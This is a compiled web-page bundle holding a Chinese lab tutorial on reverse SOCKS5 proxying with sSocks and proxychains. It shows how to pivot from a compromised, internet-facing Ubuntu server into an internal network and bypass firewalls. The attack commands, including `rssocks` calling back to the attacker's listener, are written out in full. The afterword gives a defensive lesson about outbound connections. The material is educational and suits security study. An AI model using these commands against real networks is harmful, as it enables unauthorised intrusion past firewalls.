import{_ as c,V as i,W as o,Z as d,X as s,Y as a,a0 as r,$ as e,G as t}from"./framework-dfdacaa9.js";const l="/assets/socks-proxy-1.png",p="/assets/socks-proxy-2.png",h="/assets/socks-proxy-3.png",u="/assets/socks-proxy-4.png",k="/assets/socks-proxy-5.png",g="/assets/socks-proxy-6.png",b="/assets/socks-proxy-7.png",m={},v=s("div",{class:"hint-container tip"},[s("p",{class:"hint-container-title"},"前言"),s("p",null,"对于渗透测试者来说, 如何绕过防火墙的阻挡在内网展开渗透测试成为需解决的问题, 本文介绍了在夺取映射到外网的内网服务器权限后, 如何利用 Socks 代理反弹获得内网访问权限。")],-1),x=e('<h2 id="环境介绍" tabindex="-1"><a class="header-anchor" href="#环境介绍" aria-hidden="true">#</a> 环境介绍</h2><table><thead><tr><th>机子</th><th>系统</th><th>IP</th></tr></thead><tbody><tr><td>攻击机</td><td><code>kali Liunx</code></td><td>192.168.199.130 (外网)</td></tr><tr><td>目标主机</td><td><code>ubuntu-server</code></td><td>192.168.199.131 (外网)；192.168.235.143 (内网)</td></tr><tr><td>内网主机</td><td><code>Metasploitable2-Liunx</code></td><td>192.168.235.142 (内网)</td></tr></tbody></table><h2 id="工具介绍" tabindex="-1"><a class="header-anchor" href="#工具介绍" aria-hidden="true">#</a> 工具介绍</h2><h3 id="ssocks" tabindex="-1"><a class="header-anchor" href="#ssocks" aria-hidden="true">#</a> sSocks</h3><p>sSocks 是一个 socks 代理工具套装, 可用来开启 socks 代理服务, 支持 socks5 验证, 支持 IPV6 和 UDP, 并提供反向 socks 代理服务, 即将远程计算机作为 socks 代理服务端, 反弹回本地, 极大方便内网的渗透测试</p><h3 id="下载" tabindex="-1"><a class="header-anchor" href="#下载" aria-hidden="true">#</a> 下载</h3>',6),f={href:"http://sourceforge.net/projects/ssocks/",target:"_blank",rel:"noopener noreferrer"},_=s("br",null,null,-1),y=s("code",null,"0.0.14",-1),S=e(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">wget</span> https://nchc.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gz
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="解压并编译" tabindex="-1"><a class="header-anchor" href="#解压并编译" aria-hidden="true">#</a> 解压并编译</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">tar</span> <span class="token parameter variable">-xzvf</span> ssocks-0.0.14.tar.gz
<span class="token builtin class-name">cd</span> ssocks-0.0.14
./configure <span class="token operator">&amp;&amp;</span> <span class="token function">make</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="hint-container warning"><p class="hint-container-title">注意</p><p>编译的时候要先确定机子上有 gcc 环境, 没有的请自行安装</p></div><h3 id="功能" tabindex="-1"><a class="header-anchor" href="#功能" aria-hidden="true">#</a> 功能</h3><p>编译完成, 进入 sr c 目录, 会发现有 <code>nsocks</code> 、 <code>ssocksd</code> 、 <code>ssocks</code> 、 <code>rcsocks</code> , 其功能说明介绍如下:</p><ul><li><strong>nsocks</strong> 类似通过 Socks5 代理后的 netcat, 可用来测试 socks server</li><li><strong>ssocksd</strong> 用来开启 Socks5 代理服务</li><li><strong>ssocks</strong> 本地启用 Socks5 服务, 并反弹到另一 IP 地址</li><li><strong>rcsocks</strong> 接收反弹过来的 Socks5 服务, 并转向另一端口</li></ul><h2 id="攻击步骤" tabindex="-1"><a class="header-anchor" href="#攻击步骤" aria-hidden="true">#</a> 攻击步骤</h2><p>现假设已获得 <code>ubuntu-server</code> 权限, 也将 ssocks 这软件上传至该服务器（包含解压和编译）</p><h3 id="执行本地监听" tabindex="-1"><a class="header-anchor" href="#执行本地监听" aria-hidden="true">#</a> 执行本地监听</h3><p>机子: <code>kali Liunx</code> ；IP: <code>192.168.199.130</code></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">cd</span> ssocks-0.0.14/src
./rcsocks <span class="token parameter variable">-l</span> <span class="token number">1088</span> <span class="token parameter variable">-p</span> <span class="token number">1080</span> <span class="token parameter variable">-vv</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>等待远程 Socks5 服务器访问本地 1080 端口, 创建端口 1080 与本地端口 1088 的连接通道<br></p><figure><img src="`+l+`" alt="Socks 代理" tabindex="0" loading="lazy"><figcaption>Socks 代理</figcaption></figure><h3 id="开启-socks5-代理服务-反弹" tabindex="-1"><a class="header-anchor" href="#开启-socks5-代理服务-反弹" aria-hidden="true">#</a> 开启 Socks5 代理服务, 反弹</h3><p>机子: <code>ubuntu-server</code> ；IP: <code>192.168.199.131</code></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">cd</span> ssocks-0.0.14/src
./rssocks <span class="token parameter variable">-vv</span> <span class="token parameter variable">-s</span> <span class="token number">192.168</span>.199.130:1080
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>启用 Socks5 服务, 反弹到 <code>192.168.199.130</code> （即 <code>kali Liunx</code> ） 的端口 1080 上<br></p><figure><img src="`+p+'" alt="Socks 代理" tabindex="0" loading="lazy"><figcaption>Socks 代理</figcaption></figure><p>此时在渗透测试端 <code>192.168.199.130</code> （即 <code>kali Liunx</code> ） 可看到通道连接成功<br></p><figure><img src="'+h+`" alt="Socks 代理" tabindex="0" loading="lazy"><figcaption>Socks 代理</figcaption></figure><h3 id="利用-proxychains-进行-socks5-代理" tabindex="-1"><a class="header-anchor" href="#利用-proxychains-进行-socks5-代理" aria-hidden="true">#</a> 利用 proxychains 进行 Socks5 代理</h3><p>机子: <code>kali Liunx</code> ；IP: <code>192.168.199.130</code></p><h4 id="proxychains-介绍" tabindex="-1"><a class="header-anchor" href="#proxychains-介绍" aria-hidden="true">#</a> proxychains 介绍</h4><p>通过前面的步骤, Socks5 代理已创建完成了。由于在渗透测试过程中, 需要使用不同的工具程序, 而在各程序中分别配置 Socks5 代理信息较为繁琐, 而部分程序并不支持配置 Socks5 代理。为了简化这些操作, 我们可以采用 <code>proxychains</code> 。</p><p>proxychains 是一个代理客户端软件, 可以支持几乎所有程序的代理, 如 <code>ssh</code> , <code>telnet</code> , <code>ftp</code> 等。利用 <code>proxychains</code> , 程序能在代理的环境下被加载运行, 而本身不需要具备代理功能。</p><h4 id="proxychains-下载" tabindex="-1"><a class="header-anchor" href="#proxychains-下载" aria-hidden="true">#</a> proxychains 下载</h4><p>需要 git 环境, 在 <code>kali Liunx</code> 使用 <code>proxychains</code></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">git</span> clone https://github.com/haad/proxychains.git
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="编译和安装" tabindex="-1"><a class="header-anchor" href="#编译和安装" aria-hidden="true">#</a> 编译和安装</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">cd</span> proxychains
./configure
<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="修改配置文件" tabindex="-1"><a class="header-anchor" href="#修改配置文件" aria-hidden="true">#</a> 修改配置文件</h4><p>使用前需要对 proxychains 进行简单配置, 打开配置文件 <code>/etc/proxychains.conf</code> 在 <code>[ProxyList]</code> 处添加</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>socks5 <span class="token number">127.0</span>.0.1 <span class="token number">1088</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+u+`" alt="Socks 代理" tabindex="0" loading="lazy"><figcaption>Socks 代理</figcaption></figure><p>配置成功后若要启动程序, 仅需要在启动程序命令前加上 <code>proxychains</code></p><h3 id="启用浏览器-firefox" tabindex="-1"><a class="header-anchor" href="#启用浏览器-firefox" aria-hidden="true">#</a> 启用浏览器 firefox</h3><p>机子: <code>kali Liunx</code> ；IP: <code>192.168.199.130</code></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>proxychains firefox
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+k+'" alt="Socks 代理" tabindex="0" loading="lazy"><figcaption>Socks 代理</figcaption></figure><h3 id="访问内网机子" tabindex="-1"><a class="header-anchor" href="#访问内网机子" aria-hidden="true">#</a> 访问内网机子</h3><p>机子: <code>kali Liunx</code> ；IP: <code>192.168.235.143</code></p><div class="hint-container warning"><p class="hint-container-title">注意</p><p>现在已经可以直接访问内网主机了, IP: <code>192.168.235.142</code></p></div><figure><img src="'+g+'" alt="Socks 代理" tabindex="0" loading="lazy"><figcaption>Socks 代理</figcaption></figure><p>随便点个链接, 然后再看一眼 <code>ubuntu-server</code> 中的日志, 成功访问到内网中的页面<br></p><figure><img src="'+b+'" alt="Socks 代理" tabindex="0" loading="lazy"><figcaption>Socks 代理</figcaption></figure><h2 id="后记" tabindex="-1"><a class="header-anchor" href="#后记" aria-hidden="true">#</a> 后记</h2><p>由于系统管理员的疏忽或者业务需求所致, 防火墙一般仅对由外向内发起的数据连接进行严格判断、过滤、甚至阻断而忽略由内往外的连接。因此, 在此种情况下, 通过攻陷映射到公网的端口服务, 利用反弹便可获取内网访问权限, 给内网安全带来极大的威胁。在信息安全建设与运维过程中, 不仅要加强映射到公网的服务安全, 也要重视由内到外连接的安全威胁 � 维过程中, 不仅要加强映射到公网的服务安全, 也要重视由内到外连接的安全威胁</p>',48);function L(P,I){const n=t("ExternalLinkIcon");return i(),o("div",null,[v,d(" more "),x,s("p",null,[s("a",f,[a("sSocks 更新地址"),r(n)]),_,a(" 这里下载的版本为 "),y]),S])}const V=c(m,[["render",L],["__file","socks-proxy-rebound.html.vue"]]);export{V as default};
